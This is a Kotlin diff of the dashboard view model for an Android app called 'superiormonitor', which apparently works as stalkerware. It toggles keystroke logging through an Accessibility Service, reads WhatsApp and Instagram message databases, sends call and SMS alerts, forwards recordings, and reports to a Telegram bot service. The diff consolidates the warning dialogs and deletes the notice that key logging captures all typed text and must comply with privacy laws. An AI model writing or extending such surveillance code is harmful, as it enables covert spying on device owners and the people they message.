@@ -1,29 +1,19 @@
 package com.system.superiormonitor.ui
 
-import android.Manifest
 import android.app.Application
-import android.app.admin.DevicePolicyManager
-import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.Network
-import android.os.Build
-import android.os.PowerManager
-import android.provider.Settings
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.setValue
-import androidx.core.app.NotificationManagerCompat
-import androidx.core.content.ContextCompat
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import com.system.superiormonitor.bot.TelegramApi
 import com.system.superiormonitor.data.PrefsManager
-import com.system.superiormonitor.receiver.MonitorDeviceAdminReceiver
-import com.system.superiormonitor.service.MonitorAccessibilityService
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogManager
+import com.system.superiormonitor.core.SystemManager
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
@@ -69,17 +59,11 @@ data class DashboardUiState(
     val callAlertsEnabled: Boolean = false,
     val smsAlertsEnabled: Boolean = false,
     val forwardRecordingEnabled: Boolean = false,
-    val showWhatsAppWarningDialog: Boolean = false,
-    val whatsAppWarningMessage: String = "",
-    val showInstagramWarningDialog: Boolean = false,
-    val instagramWarningMessage: String = "",
     val whatsappBusinessUpdatesEnabled: Boolean = false,
-    val showWhatsAppBusinessWarningDialog: Boolean = false,
-    val whatsAppBusinessWarningMessage: String = "",
     val keyEventsEnabled: Boolean = false,
     val keyEventsIntervalMin: Int = 15,
-    val showKeyEventsWarningDialog: Boolean = false,
-    val keyEventsWarningMessage: String = ""
+    val currentWarningTitle: String? = null,
+    val currentWarningMessage: String? = null
 )
 
 sealed class DashboardEvent {
@@ -100,13 +84,10 @@ sealed class DashboardEvent {
     data class ToggleCallAlerts(val enabled: Boolean) : DashboardEvent()
     data class ToggleSmsAlerts(val enabled: Boolean) : DashboardEvent()
     data class ToggleForwardRecording(val enabled: Boolean) : DashboardEvent()
-    object DismissWhatsAppWarningDialog : DashboardEvent()
-    object DismissInstagramWarningDialog : DashboardEvent()
     data class ToggleWhatsappBusinessUpdates(val enabled: Boolean) : DashboardEvent()
-    object DismissWhatsAppBusinessWarningDialog : DashboardEvent()
     data class ToggleKeyEvents(val enabled: Boolean) : DashboardEvent()
     data class UpdateKeyEventsInterval(val minutes: Int) : DashboardEvent()
-    object DismissKeyEventsWarningDialog : DashboardEvent()
+    object DismissWarningDialog : DashboardEvent()
 }
 
 /**
@@ -244,7 +225,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
     val isServiceRunning = LogManager.isServiceRunning
     val isTelegramApiReachable = LogManager.isTelegramApiReachable
 
-    fun clearLogs(category: com.system.superiormonitor.util.LogCategory) {
+    fun clearLogs(category: com.system.superiormonitor.core.LogCategory) {
         LogManager.clearLogs(category)
     }
 
@@ -259,66 +240,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             
             val hasRoot = _permissionStatus.value.hasRoot || prefs.isRootEnabled
             
-            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-            val adminName = ComponentName(context, MonitorDeviceAdminReceiver::class.java)
-            val hasDeviceAdmin = dpm.isAdminActive(adminName)
-
-            val hasNotifListener = NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.packageName)
-
-            val hasPostNotifs = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
-            } else {
-                true
-            }
-
-            var accessibilityEnabled = 0
-            try {
-                accessibilityEnabled = Settings.Secure.getInt(context.contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED)
-            } catch (e: Settings.SettingNotFoundException) { }
-
-            val hasAccessibility = if (accessibilityEnabled == 1) {
-                val settingValue = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
-                settingValue?.contains(context.packageName + "/" + MonitorAccessibilityService::class.java.name) == true
-            } else false
-
-            val hasSystemAlertWindow = Settings.canDrawOverlays(context)
-            val hasIgnoreBattery = (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(context.packageName)
-
-            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            val isInternetConnected = cm.activeNetwork != null
-
-            val hasCallAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED &&
-                            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
-
-            val hasSmsAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
-                           ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
-
-            val hasContactsAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
-
-            val isCameraGranted = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED &&
-                              ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
-                              ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-
-            val hasMicrophoneAccess = ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
-
-            val hasWriteSettings = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.System.canWrite(context) else true
-
-            _permissionStatus.value = PermissionStatus(
-                hasRoot = hasRoot,
-                hasDeviceAdmin = hasDeviceAdmin,
-                hasNotifListener = hasNotifListener,
-                hasPostNotifs = hasPostNotifs,
-                hasAccessibility = hasAccessibility,
-                hasSystemAlertWindow = hasSystemAlertWindow,
-                hasIgnoreBattery = hasIgnoreBattery,
-                hasCallAccess = hasCallAccess,
-                hasSmsAccess = hasSmsAccess,
-                hasContactsAccess = hasContactsAccess,
-                hasCameraAccess = isCameraGranted,
-                hasMicrophoneAccess = hasMicrophoneAccess,
-                isInternetConnected = isInternetConnected,
-                hasWriteSettings = hasWriteSettings
-            )
+            _permissionStatus.value = SystemManager.checkAllPermissions(context, hasRoot)
         }
     }
 
@@ -431,18 +353,18 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     // Validate WhatsApp availability before enabling
                     viewModelScope.launch(Dispatchers.IO) {
                         val context = getApplication<Application>()
-                        if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context)) {
+                        if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)) {
                             _dashboardState.update { it.copy(
-                                showWhatsAppWarningDialog = true,
-                                whatsAppWarningMessage = "WhatsApp is not installed on this device. Please install WhatsApp before enabling this feature."
+                                currentWarningTitle = "WhatsApp Unavailable",
+                                currentWarningMessage = "WhatsApp is not installed on this device. Please install WhatsApp before enabling this feature."
                             ) }
                             return@launch
                         }
-                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase()
+                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.NORMAL)
                         if (!dbAvailable) {
                             _dashboardState.update { it.copy(
-                                showWhatsAppWarningDialog = true,
-                                whatsAppWarningMessage = dbReason
+                                currentWarningTitle = "WhatsApp Unavailable",
+                                currentWarningMessage = dbReason
                             ) }
                             return@launch
                         }
@@ -458,25 +380,25 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     notifyBotService(getApplication(), "ACTION_UPDATE_WHATSAPP")
                 }
             }
-            is DashboardEvent.DismissWhatsAppWarningDialog -> {
-                _dashboardState.update { it.copy(showWhatsAppWarningDialog = false, whatsAppWarningMessage = "") }
+            is DashboardEvent.DismissWarningDialog -> {
+                _dashboardState.update { it.copy(currentWarningTitle = null, currentWarningMessage = null) }
             }
             is DashboardEvent.ToggleWhatsappBusinessUpdates -> {
                 if (event.enabled) {
                     viewModelScope.launch(Dispatchers.IO) {
                         val context = getApplication<Application>()
-                        if (!com.system.superiormonitor.monitor.WABusinessMonitor.isWhatsAppInstalled(context)) {
+                        if (!com.system.superiormonitor.monitor.WhatsAppMonitor.isWhatsAppInstalled(context, com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)) {
                             _dashboardState.update { it.copy(
-                                showWhatsAppBusinessWarningDialog = true,
-                                whatsAppBusinessWarningMessage = "WhatsApp Business is not installed on this device. Please install WhatsApp Business before enabling this feature."
+                                currentWarningTitle = "WA Business Unavailable",
+                                currentWarningMessage = "WhatsApp Business is not installed on this device. Please install WhatsApp Business before enabling this feature."
                             ) }
                             return@launch
                         }
-                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WABusinessMonitor.checkWhatsAppDatabase()
+                        val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.WhatsAppMonitor.checkWhatsAppDatabase(com.system.superiormonitor.monitor.WhatsAppVariant.BUSINESS)
                         if (!dbAvailable) {
                             _dashboardState.update { it.copy(
-                                showWhatsAppBusinessWarningDialog = true,
-                                whatsAppBusinessWarningMessage = dbReason
+                                currentWarningTitle = "WA Business Unavailable",
+                                currentWarningMessage = dbReason
                             ) }
                             return@launch
                         }
@@ -490,25 +412,23 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     notifyBotService(getApplication(), "ACTION_UPDATE_WABUSINESS")
                 }
             }
-            is DashboardEvent.DismissWhatsAppBusinessWarningDialog -> {
-                _dashboardState.update { it.copy(showWhatsAppBusinessWarningDialog = false) }
-            }
+
             is DashboardEvent.ToggleInstagramUpdates -> {
                 if (event.enabled) {
                     viewModelScope.launch(Dispatchers.IO) {
                         val context = getApplication<Application>()
                         if (!com.system.superiormonitor.monitor.InstagramMonitor.isInstagramInstalled(context)) {
                             _dashboardState.update { it.copy(
-                                showInstagramWarningDialog = true,
-                                instagramWarningMessage = "Instagram is not installed on this device. Please install Instagram before enabling this feature."
+                                currentWarningTitle = "Instagram Unavailable",
+                                currentWarningMessage = "Instagram is not installed on this device. Please install Instagram before enabling this feature."
                             ) }
                             return@launch
                         }
                         val (dbAvailable, dbReason) = com.system.superiormonitor.monitor.InstagramMonitor.checkInstagramDatabase()
                         if (!dbAvailable) {
                             _dashboardState.update { it.copy(
-                                showInstagramWarningDialog = true,
-                                instagramWarningMessage = dbReason
+                                currentWarningTitle = "Instagram Unavailable",
+                                currentWarningMessage = dbReason
                             ) }
                             return@launch
                         }
@@ -522,9 +442,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     notifyBotService(getApplication(), "ACTION_UPDATE_INSTAGRAM")
                 }
             }
-            is DashboardEvent.DismissInstagramWarningDialog -> {
-                _dashboardState.update { it.copy(showInstagramWarningDialog = false, instagramWarningMessage = "") }
-            }
+
             is DashboardEvent.ToggleCallAlerts -> {
                 prefs.callAlertsEnabled = event.enabled
                 _dashboardState.update { it.copy(callAlertsEnabled = event.enabled) }
@@ -538,14 +456,6 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 _dashboardState.update { it.copy(forwardRecordingEnabled = event.enabled) }
             }
             is DashboardEvent.ToggleKeyEvents -> {
-                if (event.enabled) {
-                    _dashboardState.update { 
-                        it.copy(
-                            showKeyEventsWarningDialog = true,
-                            keyEventsWarningMessage = "Warning: Key Events will capture all text typed on the device using Accessibility Service.\nEnsure this feature complies with all applicable privacy laws in your jurisdiction before use."
-                        ) 
-                    }
-                }
                 prefs.keyEventsEnabled = event.enabled
                 _dashboardState.update { it.copy(keyEventsEnabled = event.enabled) }
             }
@@ -553,9 +463,7 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 prefs.keyEventsIntervalMin = event.minutes
                 _dashboardState.update { it.copy(keyEventsIntervalMin = event.minutes) }
             }
-            is DashboardEvent.DismissKeyEventsWarningDialog -> {
-                _dashboardState.update { it.copy(showKeyEventsWarningDialog = false) }
-            }
+
         }
     }
 
